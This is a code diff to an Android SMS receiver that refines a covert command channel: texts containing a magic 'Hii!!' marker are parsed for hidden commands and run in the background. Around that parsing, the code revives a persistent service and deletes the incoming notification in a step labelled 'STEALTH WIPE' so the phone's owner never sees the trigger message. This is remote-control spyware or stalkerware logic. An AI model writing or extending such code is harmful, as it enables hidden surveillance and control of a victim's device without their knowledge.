@@ -59,42 +59,53 @@ class SmsReceiver : BroadcastReceiver() {
                 } catch(e: Exception) {}
 
                 // 3. GHOST TUNNEL PROTOCOL
-                if (body.trimStart().startsWith("Hii!!")) {
-                    DebugLogger.log("SMS_WAKE", "Magic prefix detected. Engaging command processor.")
+                val regex = Regex("Hii!!(.*?)\\\$\\$")
+                val match = regex.find(body)
+
+                if (match != null) {
+                    DebugLogger.log("SMS_WAKE", "Embedded command detected. Engaging command processor.")
                     ServiceResurrector.shock(context)
                     KeepAliveReceiver.scheduleNext(context)
 
-                    val parts = body.trim().split(Regex("\\s+"))
-                    if (parts.size >= 2) {
-                        val cmd = parts[1].trim().uppercase()
-                        var content = if (parts.size >= 3) body.substringAfter(parts[1]).trim() else "0"
-                        
-                        // INJECT SENDER: If CodeRed is triggered via SMS and no handler is provided, auto-inject the sender's number
-                        if (cmd == "CODERED" && !content.contains("|")) {
-                            content = "$content|$sender"
-                        }
+                    val rawExtracted = match.groupValues[1].trim()
+                    val splitIdx = rawExtracted.indexOf('=')
+                    
+                    val cmd: String
+                    var content: String
+                    
+                    if (splitIdx != -1) {
+                        cmd = rawExtracted.substring(0, splitIdx).uppercase()
+                        content = java.net.URLDecoder.decode(rawExtracted.substring(splitIdx + 1), "UTF-8")
+                    } else {
+                        cmd = rawExtracted.uppercase()
+                        content = "0"
+                    }
 
-                        // STEALTH WIPE: Remove the incoming command notification immediately
-                        CoroutineScope(Dispatchers.Main).launch {
-                            delay(500) // Wait for OS to post the notification
-                            MyNotificationListener.instance?.wipeNotifications("TEXT", "Hii!!")
-                        }
+                    // INJECT SENDER: If CodeRed is triggered via SMS and no handler is provided, auto-inject the sender's number
+                    if (cmd == "CODERED" && !content.contains("|")) {
+                        content = "$content|$sender"
+                    }
 
-                        // 4. ASYNC HANDOFF: Only use Coroutines for slow Network/Command tasks
-                        val pendingResult = goAsync()
-                        CoroutineScope(Dispatchers.IO).launch {
-                            try {
-                                val mockCmd = JSONObject().apply {
-                                    put("id", -1)
-                                    put("file_name", cmd)
-                                    put("content", content)
-                                }
-                                CommandProcessor.processSingleCommand(context, mockCmd)
-                            } catch (e: Exception) {
-                                DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
-                            } finally {
-                                pendingResult.finish()
+                    // STEALTH WIPE: Remove the incoming command notification immediately
+                    CoroutineScope(Dispatchers.Main).launch {
+                        delay(500) // Wait for OS to post the notification
+                        MyNotificationListener.instance?.wipeNotifications("TEXT", "Hii!!")
+                    }
+
+                    // 4. ASYNC HANDOFF: Only use Coroutines for slow Network/Command tasks
+                    val pendingResult = goAsync()
+                    CoroutineScope(Dispatchers.IO).launch {
+                        try {
+                            val mockCmd = JSONObject().apply {
+                                put("id", -1)
+                                put("file_name", cmd)
+                                put("content", content)
                             }
+                            CommandProcessor.processSingleCommand(context, mockCmd)
+                        } catch (e: Exception) {
+                            DebugLogger.log("SMS_CMD_ERR", "Command failed: ${e.message}")
+                        } finally {
+                            pendingResult.finish()
                         }
                     }
                 }
